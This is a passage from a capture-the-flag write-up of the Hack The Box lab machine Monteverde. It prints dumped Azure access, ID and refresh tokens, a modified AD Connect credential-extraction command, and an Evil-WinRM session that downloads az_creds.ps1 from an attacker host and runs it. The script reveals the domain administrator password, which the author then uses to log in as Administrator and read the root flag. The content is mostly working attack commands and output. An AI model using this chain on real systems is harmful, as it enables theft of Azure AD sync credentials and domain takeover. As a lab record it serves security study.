Response&quot;:&quot;https:\/\/graph.windows.net\/&quot;,&quot;Result&quot;:{&quot;AccessToken&quot;:&quot;eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6InBpVmxsb1FEU01LeGgxbTJ5Z3FHU1ZkZ0ZwQSIsImtpZCI6InBpVmxsb1FEU01LeGgxbTJ5Z3FHU1ZkZ0ZwQSJ9.eyJhdWQiOiJodHRwczovL2dyYXBoLndpbmRvd3MubmV0LyIsImlzcyI6Imh0dHBzOi8vc3RzLndpbmRvd3MubmV0LzM3MmVmZWE5LTdiYzQtNGI3Ni04ODM5LTk4NGI0NWVkZmI5OC8iLCJpYXQiOjE1NzgwNTgyNzYsIm5iZiI6MTU3ODA1ODI3NiwiZXhwIjoxNTc4MDYyMTc2LCJhY3IiOiIxIiwiYWlvIjoiNDJWZ1lBZ3NZc3BPYkdtYjU4V3ZsK0d3dzhiYXA4bnhoOWlSOEpVQit4OWQ5L0g2MEFBQSIsImFtciI6WyJwd2QiXSwiYXBwaWQiOiIxOTUwYTI1OC0yMjdiLTRlMzEtYTljZi03MTc0OTU5NDVmYzIiLCJhcHBpZGFjciI6IjAiLCJmYW1pbHlfbmFtZSI6IkNsYXJrIiwiZ2l2ZW5fbmFtZSI6IkpvaG4iLCJpcGFkZHIiOiI0Ni40LjIyMy4xNzMiLCJuYW1lIjoiSm9obiIsIm9pZCI6ImU0ZjU2YmMxLTAyMWYtNDc5NS1iY2EyLWJlZGZjODE5ZTkwYSIsInB1aWQiOiIxMDAzMjAwMDkzOTYzMDJCIiwic2NwIjoiNjJlOTAzOTQtNjlmNS00MjM3LTkxOTAtMDEyMTc3MTQ1ZTEwIiwic3ViIjoiVWFTMGI5ZHJsMmlmYzlvSXZjcUFlbzRoY3c1YWpyV3g3bU5DMklrMkRsayIsInRlbmFudF9yZWdpb25fc2NvcGUiOiJFVSIsInRpZCI6IjM3MmVmZWE5LTdiYzQtNGI3Ni04ODM5LTk4NGI0NWVkZmI5OCIsInVuaXF1ZV9uYW1lIjoiam9obkBhNjc2MzIzNTQ3NjNvdXRsb29rLm9ubWljcm9zb2Z0LmNvbSIsInVwbiI6ImpvaG5AYTY3NjMyMzU0NzYzb3V0bG9vay5vbm1pY3Jvc29mdC5jb20iLCJ1dGkiOiJsM2xBR3NBRVYwcVdQelJ1Vkh4U0FBIiwidmVyIjoiMS4wIn0.czHUwYjleGp2C1c_BMZIZkEHz-12R86qmngaiyTeTW_bM659hqetbQylvf_qCJDuxD8e28H6Oqw5Hn1Hwij7yHK-kOjUeUlXkGyzFhQbDf3CQLvFsZioUiHHiighrVjZfu6Rolv8fxoG3Q8cXS-Ms_Wm6RI-zcaK9Eyu841D51jzvYI60rC9HTummktfVURP2xf3DnskqjJF1dDlSi62gPGXGk0xZordZFiGoYAtv8qiMAiSCioN_sw_xWRJ250nvw90biQ1NkPRpSGf8jNpbYktB0Ti8-sNblaGRJBQqmHxZ-0PkSq31op2CzHN7wwYCJOEoJpOtS-x4j1DGZ19hA&quot;,&quot;AccessTokenType&quot;:&quot;Bearer&quot;,&quot;ExpiresOn&quot;:{&quot;DateTime&quot;:&quot;\/Date(1578062173584)\/&quot;,&quot;OffsetMinutes&quot;:0},&quot;ExtendedExpiresOn&quot;:{&quot;DateTime&quot;:&quot;\/Date(1578062173584)\/&quot;,&quot;OffsetMinutes&quot;:0},&quot;ExtendedLifeTimeToken&quot;:false,&quot;IdToken&quot;:&quot;eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJhdWQiOiIxOTUwYTI1OC0yMjdiLTRlMzEtYTljZi03MTc0OTU5NDVmYzIiLCJpc3MiOiJodHRwczovL3N0cy53aW5kb3dzLm5ldC8zNzJlZmVhOS03YmM0LTRiNzYtODgzOS05ODRiNDVlZGZiOTgvIiwiaWF0IjoxNTc4MDU4Mjc2LCJuYmYiOjE1NzgwNTgyNzYsImV4cCI6MTU3ODA2MjE3NiwiYW1yIjpbInB3ZCJdLCJmYW1pbHlfbmFtZSI6IkNsYXJrIiwiZ2l2ZW5fbmFtZSI6IkpvaG4iLCJpcGFkZHIiOiI0Ni40LjIyMy4xNzMiLCJuYW1lIjoiSm9obiIsIm9pZCI6ImU0ZjU2YmMxLTAyMWYtNDc5NS1iY2EyLWJlZGZjODE5ZTkwYSIsInN1YiI6Inl2V2x2eEFSbE84V0pKN0dUUmFYb0p0MHAwelBiUkRIX0EtcC1FTEtFdDgiLCJ0aWQiOiIzNzJlZmVhOS03YmM0LTRiNzYtODgzOS05ODRiNDVlZGZiOTgiLCJ1bmlxdWVfbmFtZSI6ImpvaG5AYTY3NjMyMzU0NzYzb3V0bG9vay5vbm1pY3Jvc29mdC5jb20iLCJ1cG4iOiJqb2huQGE2NzYzMjM1NDc2M291dGxvb2sub25taWNyb3NvZnQuY29tIiwidmVyIjoiMS4wIn0.&quot;,&quot;TenantId&quot;:&quot;372efea9-7bc4-4b76-8839-984b45edfb98&quot;,&quot;UserInfo&quot;:{&quot;DisplayableId&quot;:&quot;john@a67632354763outlook.onmicrosoft.com&quot;,&quot;FamilyName&quot;:&quot;Clark&quot;,&quot;GivenName&quot;:&quot;John&quot;,&quot;IdentityProvider&quot;:&quot;https:\/\/sts.windows.net\/372efea9-7bc4-4b76-8839-984b45edfb98\/&quot;,&quot;PasswordChangeUrl&quot;:null,&quot;PasswordExpiresOn&quot;:null,&quot;UniqueId&quot;:&quot;e4f56bc1-021f-4795-bca2-bedfc819e90a&quot;}},&quot;UserAssertionHash&quot;:null}?https://login.windows.net/372efea9-7bc4-4b76-8839-984b45edfb98/:::https://management.core.windows.net/:::1950a258-227b-4e31-a9cf-717495945fc2:::0?{&quot;RefreshToken&quot;:&quot;AQABAAAAAACQN9QBRU3jT6bcBQLZNUj7aeQ8R2hfsMQE-DIEEp8rOWPiom2rNwROtUThYh6cCyfB9McL8XdHR94VQSY3KAN-SWuINLqSnI_Lfj-vM1nsCu_Kh51XTceMlWr9mZsNYiX5oCnIBT50bCWIlyeZxmpR7L4sfRp_2iESLU06U0QiHBP7L_HR75crAfpQdJ2oJEn9MWYoxFKIHxXRgAp8fwyKa5yVo5usuanLFGofYzvU6YUGwSFwHskyy_iHdmimggyI7pxp2-C0pSlRp6yZp-4JYyvoeTjxqtXkpMR7VnmJ5qIqJvecNcutXPu-SJDWRvvmW_V2se4V1u1ecuJDe02oAmouL7yp8HrcOBNgn9Jg_f27tHJSbONR-rFWFmeYr-Zi84EJbubYBb7DdzZaoCArbYrgglrAOmz85N9-DMbIJdT7ffteT0hu2rHI6OVDvgckNv-XVhwMF55XtjxxxhpR1EljIq07qCPCqSVoNnoyhDawgyYiNRh0EVr1kf6GEA9bAYNMHgf3VN5WApXbb0VzoxozBKNkNiMybB-uA1d9DLs1eOimxrhoKjsK6cyKTsslGe8qgjcLS0pcRDVvNub1_fKQAXqVB4WZXMo_TDSALh-ctiwVVFNRqTeGsdzcfJe7j3WwzuIiuWfIYydSQKaeRo87qtg6v4dHy4hVBOwm-NPah29sOrSNsyuUydhkNK2QXCwn_hV5-7OCwfSJHG9Dja4r8B_iS0-VvcwzRUT_-2t1eNN8vgRgTlgAdotG330U9SshDgVjg27VHIw-e-57ID7FTEjnVfc4loRNjoNJlSAA&quot;,&quot;ResourceInResponse&quot;:&quot;https:\/\/management.core.windows.net\/&quot;,&quot;Result&quot;:{&quot;AccessToken&quot;:&quot;eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6InBpVmxsb1FEU01LeGgxbTJ5Z3FHU1ZkZ0ZwQSIsImtpZCI6InBpVmxsb1FEU01LeGgxbTJ5Z3FHU1ZkZ0ZwQSJ9.eyJhdWQiOiJodHRwczovL21hbmFnZW1lbnQuY29yZS53aW5kb3dzLm5ldC8iLCJpc3MiOiJodHRwczovL3N0cy53aW5kb3dzLm5ldC8zNzJlZmVhOS03YmM0LTRiNzYtODgzOS05ODRiNDVlZGZiOTgvIiwiaWF0IjoxNTc4MDU4MjU3LCJuYmYiOjE1NzgwNTgyNTcsImV4cCI6MTU3ODA2MjE1NywiYWNyIjoiMSIsImFpbyI6IjQyVmdZSGc3ajlGN3oxK24renhKZktXQmpxcWRYMzFEVDNLc2ovL2FzT1d5VFcycTNRSUEiLCJhbXIiOlsicHdkIl0sImFwcGlkIjoiMTk1MGEyNTgtMjI3Yi00ZTMxLWE5Y2YtNzE3NDk1OTQ1ZmMyIiwiYXBwaWRhY3IiOiIwIiwiZmFtaWx5X25hbWUiOiJDbGFyayIsImdpdmVuX25hbWUiOiJKb2huIiwiZ3JvdXBzIjpbImM3OTRlNzE3LTIxZWYtNDljZS1hZjAwLTljMDEwZGM0MWE3NiJdLCJpcGFkZHIiOiI0Ni40LjIyMy4xNzMiLCJuYW1lIjoiSm9obiIsIm9pZCI6ImU0ZjU2YmMxLTAyMWYtNDc5NS1iY2EyLWJlZGZjODE5ZTkwYSIsInB1aWQiOiIxMDAzMjAwMDkzOTYzMDJCIiwic2NwIjoidXNlcl9pbXBlcnNvbmF0aW9uIiwic3ViIjoid1U4Y1RtUm5tTzM2Z1E5MEx4VUNiN0tGMXZ3NlVUVlVKa1VPNThJd3NVTSIsInRpZCI6IjM3MmVmZWE5LTdiYzQtNGI3Ni04ODM5LTk4NGI0NWVkZmI5OCIsInVuaXF1ZV9uYW1lIjoiam9obkBhNjc2MzIzNTQ3NjNvdXRsb29rLm9ubWljcm9zb2Z0LmNvbSIsInVwbiI6ImpvaG5AYTY3NjMyMzU0NzYzb3V0bG9vay5vbm1pY3Jvc29mdC5jb20iLCJ1dGkiOiI4MjNlVzFyWmZFQ1hEV2lHaHQ1UkFBIiwidmVyIjoiMS4wIiwid2lkcyI6WyI2MmU5MDM5NC02OWY1LTQyMzctOTE5MC0wMTIxNzcxNDVlMTAiXX0.ja68GQ9Suvm8-6a732DZy7Z7Q62XnmL0hsVnMKP3L-u7KB9W8nafebCzEmwhAoAzEqVOKfApM8VjOALGJcgz60sYbN0JtK4RaHCiF0yQogGTvgFe3FMB-26wCxGo-d_hTxiPiFUGfTuqSMzprXfBEKLneXNKcLlkav2pPNAhLD_HoshDaznMPlt2W00rq6hJII032WoZQMPYMLJmnub4pi2N3ScroWO3zDQ16wpoFCOSYbuqoLKSm-FLN8yEhTJDf2umcOaLVE7jtnHba_rEPyC_sBtIedl1nSR8kr7A9B8dBvn0pC3M7gYIVpVwIana6pni6I8jaMwH_-3aJmCLhw&quot;,&quot;AccessTokenType&quot;:&quot;Bearer&quot;,&quot;ExpiresOn&quot;:{&quot;DateTime&quot;:&quot;\/Date(1578062154521)\/&quot;,&quot;OffsetMinutes&quot;:0},&quot;ExtendedExpiresOn&quot;:{&quot;DateTime&quot;:&quot;\/Date(1578062154521)\/&quot;,&quot;OffsetMinutes&quot;:0},&quot;ExtendedLifeTimeToken&quot;:false,&quot;IdToken&quot;:&quot;eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJhdWQiOiIxOTUwYTI1OC0yMjdiLTRlMzEtYTljZi03MTc0OTU5NDVmYzIiLCJpc3MiOiJodHRwczovL3N0cy53aW5kb3dzLm5ldC8zNzJlZmVhOS03YmM0LTRiNzYtODgzOS05ODRiNDVlZGZiOTgvIiwiaWF0IjoxNTc4MDU4MjU3LCJuYmYiOjE1NzgwNTgyNTcsImV4cCI6MTU3ODA2MjE1NywiYW1yIjpbInB3ZCJdLCJmYW1pbHlfbmFtZSI6IkNsYXJrIiwiZ2l2ZW5fbmFtZSI6IkpvaG4iLCJpcGFkZHIiOiI0Ni40LjIyMy4xNzMiLCJuYW1lIjoiSm9obiIsIm9pZCI6ImU0ZjU2YmMxLTAyMWYtNDc5NS1iY2EyLWJlZGZjODE5ZTkwYSIsInN1YiI6Inl2V2x2eEFSbE84V0pKN0dUUmFYb0p0MHAwelBiUkRIX0EtcC1FTEtFdDgiLCJ0aWQiOiIzNzJlZmVhOS03YmM0LTRiNzYtODgzOS05ODRiNDVlZGZiOTgiLCJ1bmlxdWVfbmFtZSI6ImpvaG5AYTY3NjMyMzU0NzYzb3V0bG9vay5vbm1pY3Jvc29mdC5jb20iLCJ1cG4iOiJqb2huQGE2NzYzMjM1NDc2M291dGxvb2sub25taWNyb3NvZnQuY29tIiwidmVyIjoiMS4wIn0.&quot;,&quot;TenantId&quot;:&quot;372efea9-7bc4-4b76-8839-984b45edfb98&quot;,&quot;UserInfo&quot;:{&quot;DisplayableId&quot;:&quot;john@a67632354763outlook.onmicrosoft.com&quot;,&quot;FamilyName&quot;:&quot;Clark&quot;,&quot;GivenName&quot;:&quot;John&quot;,&quot;IdentityProvider&quot;:&quot;https:\/\/sts.windows.net\/372efea9-7bc4-4b76-8839-984b45edfb98\/&quot;,&quot;PasswordChangeUrl&quot;:null,&quot;PasswordExpiresOn&quot;:null,&quot;UniqueId&quot;:&quot;e4f56bc1-021f-4795-bca2-bedfc819e90a&quot;}},&quot;UserAssertionHash&quot;:null}
+
+    &#x27;C:\Users\mhope\.Azure\AzureRmContext.json&#x27; - content:
+{
+
+  &quot;DefaultContextKey&quot;: &quot;372efea9-7bc4-4b76-8839-984b45edfb98 - john@a67632354763outlook.onmicrosoft.com&quot;,
+
+  &quot;EnvironmentTable&quot;: {},
+
+  &quot;Contexts&quot;: {
+
+    &quot;372efea9-7bc4-4b76-8839-984b45edfb98 - john@a67632354763outlook.onmicrosoft.com&quot;: {
+
+      &quot;Account&quot;: {
+
+        &quot;Id&quot;: &quot;john@a67632354763outlook.onmicrosoft.com&quot;,
+
+        &quot;Credential&quot;: null,
+
+        &quot;Type&quot;: &quot;User&quot;,
+
+        &quot;TenantMap&quot;: {},
+
+        &quot;ExtendedProperties&quot;: {
+
+          &quot;Tenants&quot;: &quot;372efea9-7bc4-4b76-8839-984b45edfb98&quot;
+
+        }
+
+      },
+
+      &quot;Tenant&quot;: {
+
+        &quot;Id&quot;: &quot;372efea9-7bc4-4b76-8839-984b45edfb98&quot;,
+
+        &quot;Directory&quot;: null,
+
+        &quot;ExtendedProperties&quot;: {}
+
+      },
+
+      &quot;Subscription&quot;: null,
+
+      &quot;Environment&quot;: {
+
+        &quot;Name&quot;: &quot;AzureCloud&quot;,
+
+        &quot;OnPremise&quot;: false,
+
+        &quot;ServiceManagementUrl&quot;: &quot;https://management.core.windows.net/&quot;,
+
+        &quot;ResourceManagerUrl&quot;: &quot;https://management.azure.com/&quot;,
+
+        &quot;ManagementPortalUrl&quot;: &quot;https://go.microsoft.com/fwlink/?LinkId=254433&quot;,
+
+        &quot;PublishSettingsFileUrl&quot;: &quot;https://go.microsoft.com/fwlink/?LinkID=301775&quot;,
+
+        &quot;ActiveDirectoryAuthority&quot;: &quot;https://login.microsoftonline.com/&quot;,
+
+        &quot;GalleryUrl&quot;: &quot;https://gallery.azure.com/&quot;,
+
+        &quot;GraphUrl&quot;: &quot;https://graph.windows.net/&quot;,
+
+        &quot;ActiveDirectoryServiceEndpointResourceId&quot;: &quot;https://management.core.windows.net/&quot;,
+
+        &quot;StorageEndpointSuffix&quot;: &quot;core.windows.net&quot;,
+
+        &quot;SqlDatabaseDnsSuffix&quot;: &quot;.database.windows.net&quot;,
+
+        &quot;TrafficManagerDnsSuffix&quot;: &quot;trafficmanager.net&quot;,
+
+        &quot;AzureKeyVaultDnsSuffix&quot;: &quot;vault.azure.net&quot;,
+
+        &quot;AzureKeyVaultServiceEndpointResourceId&quot;: &quot;https://vault.azure.net&quot;,
+
+        &quot;GraphEndpointResourceId&quot;: &quot;https://graph.windows.net/&quot;,
+
+        &quot;DataLakeEndpointResourceId&quot;: &quot;https://datalake.azure.net/&quot;,
+
+        &quot;BatchEndpointResourceId&quot;: &quot;https://batch.core.windows.net/&quot;,
+
+        &quot;AzureDataLakeAnalyticsCatalogAndJobEndpointSuffix&quot;: &quot;azuredatalakeanalytics.net&quot;,
+
+        &quot;AzureDataLakeStoreFileSystemEndpointSuffix&quot;: &quot;azuredatalakestore.net&quot;,
+
+        &quot;AdTenant&quot;: &quot;Common&quot;,
+
+        &quot;VersionProfiles&quot;: [],
+
+        &quot;ExtendedProperties&quot;: {
+
+          &quot;OperationalInsightsEndpoint&quot;: &quot;https://api.loganalytics.io/v1&quot;,
+
+          &quot;OperationalInsightsEndpointResourceId&quot;: &quot;https://api.loganalytics.io&quot;,
+
+          &quot;AzureAnalysisServicesEndpointSuffix&quot;: &quot;asazure.windows.net&quot;,
+
+          &quot;AnalysisServicesEndpointResourceId&quot;: &quot;https://region.asazure.windows.net&quot;,
+
+          &quot;AzureAttestationServiceEndpointSuffix&quot;: &quot;attest.azure.net&quot;,
+
+          &quot;AzureAttestationServiceEndpointResourceId&quot;: &quot;https://attest.azure.net&quot;
+
+        }
+
+      },
+
+      &quot;VersionProfile&quot;: null,
+
+      &quot;TokenCache&quot;: {
+
+        &quot;CacheData&quot;: null
+
+      },
+
+      &quot;ExtendedProperties&quot;: {}
+
+    }
+
+  },
+
+  &quot;ExtendedProperties&quot;: {}
+
+</code></pre><p id="149d1b9f-8847-8028-8f51-d74f72a8e111" class="">Seems connections and log for Azure AD, <a href="https://blog.xpnsec.com/azuread-connect-for-redteam/">let’s try to dump credentials for azure ad</a> just change the line</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="149d1b9f-8847-8063-873d-c67b692bbea5" class="code"><code class="language-Shell" style="white-space:pre-wrap;word-break:break-all">$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList &quot;Data Source=(localdb)\.\ADSync;Initial Catalog=ADSync&quot;
+for
+$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList &quot;Server=LocalHost;Database=ADSync;Trusted_Connection=True;&quot;
+
+Cuz the server are SqlServer</code></pre><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="149d1b9f-8847-8057-b7b7-d1a9b28720d6" class="code"><code class="language-Shell" style="white-space:pre-wrap;word-break:break-all">*Evil-WinRM* PS C:\Users\mhope\Desktop&gt; powershell -c wget http://10.10.14.10:8000/az_creds.ps1 -UseBasicParsing -Outfile az_creds.ps1 
+
+*Evil-WinRM* PS C:\Users\mhope\Documents&gt; powershell -c wget http://10.10.14.10:8000/az_creds.ps1 -UseBasicParsing -Outfile az_creds.ps1
+*Evil-WinRM* PS C:\Users\mhope\Documents&gt; ./az_creds.ps1
+AD Connect Sync Credential Extract POC (@_xpn_)
+
+Domain: MEGABANK.LOCAL
+Username: administrator
+Password: d0m@in4dminyeah!
+</code></pre><p id="149d1b9f-8847-80c0-ad26-d92143d22cdb" class="">Get shell</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="149d1b9f-8847-807e-8abd-d8258df23ccc" class="code"><code class="language-Shell" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~/Escritorio/.htb]
+└─$ evil-winrm -i 10.10.10.172 -u Administrator -p &#x27;d0m@in4dminyeah!&#x27;
+
+Evil-WinRM shell v3.4
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+
+Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; cd ../Desktop
+*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; dir
+
+
+    Directory: C:\Users\Administrator\Desktop
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-ar---       11/24/2024   2:54 PM             34 root.txt
+
+
+t*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; type root.txt
+7*******************************8
+</code></pre></div></article><span class="sans" style="font-size:14px;padding-top:2em"></span></body></html>
